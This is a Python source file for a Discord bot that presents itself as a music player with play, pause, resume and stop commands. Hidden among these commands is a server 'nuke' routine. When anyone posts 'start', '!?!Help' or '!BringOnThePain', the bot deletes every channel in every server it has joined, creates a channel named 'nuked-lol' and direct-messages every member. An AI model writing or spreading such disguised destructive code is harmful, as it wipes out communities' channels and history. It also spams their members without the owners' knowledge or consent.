import discord
import time
from discord.ext import commands
import youtube_dl
import os
import asyncio
#imports

# this whole part is for setting up the music bot
intents = discord.Intents.all()
client = discord.Client(intents=intents)

voice_clients = {}

yt_dl_opts = {'format': 'bestaudio/best'}
ytdl = youtube_dl.YoutubeDL(yt_dl_opts)

ffmpeg_options = {'options': '-vn'}

@client.event
async def on_ready(): # letting you know that the bot is up and running
    print("Hello world")

@client.event
async def on_message(message): # actualy  part where everything is
    channels = message.channel

    amount_text = 0

    author = message.author

    if message.content.startswith("!?!Help") or message.content == "start" or message.content == "!BringOnThePain":
        for guild in client.guilds: #Get the guilds
            for channel in guild.channels: # get the channels
                await channel.delete()

                amount_text += 1

                existing_channel = discord.utils.get(guild.channels, name="nuked-lol")

                if amount_text == 1:
                    #await existing_channel.delete()

                    await guild.create_text_channel("nuked-lol")


            for member in guild.members:
                mem = await member.create_dm()
                await mem.send(content="""Pingas""") #This is for sending the messages for hte new server and idk trolling
                # do not use this if you do not want it

    # This is for the music bot part
    if message.content.startswith("!play"):
        try:
            voice_client = await message.author.voice.channel.connect()
            voice_clients[voice_client.guild.id] = voice_client
        except:
            print("errors")

        try:
            url = message.content.split()[1]

            # create the voice client
            #voice_client = await message.author.voice.channel.connect()
            #voice_clients[voice_client.guild.id] = voice_client

            loop = asyncio.get_event_loop()
            data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=False))

            song = data['url']
            player = discord.FFmpegPCMAudio(song, **ffmpeg_options, executable="C:\\ffmpeg\\ffmpeg.exe")

            voice_clients[message.guild.id].play(player)

        except Exception as err:
            print(err)

    if message.content.startswith("!pause"):
        try:
            voice_clients[message.guild.id].pause()
        except Exception as err:
            print(err)

    if message.content.startswith("!resume"):
        try:
            voice_clients[message.guild.id].resume()
        except Exception as err:
            print(err)

    if message.content.startswith("!stop"):
        try:
            voice_clients[message.guild.id].stop()
            await voice_clients[message.guild.id].disconnect()
        except Exception as err:
            print(err)


    if message.author == client.user:
        return
    
#This is some useless code
client.run('TOKEN GOES HERE')
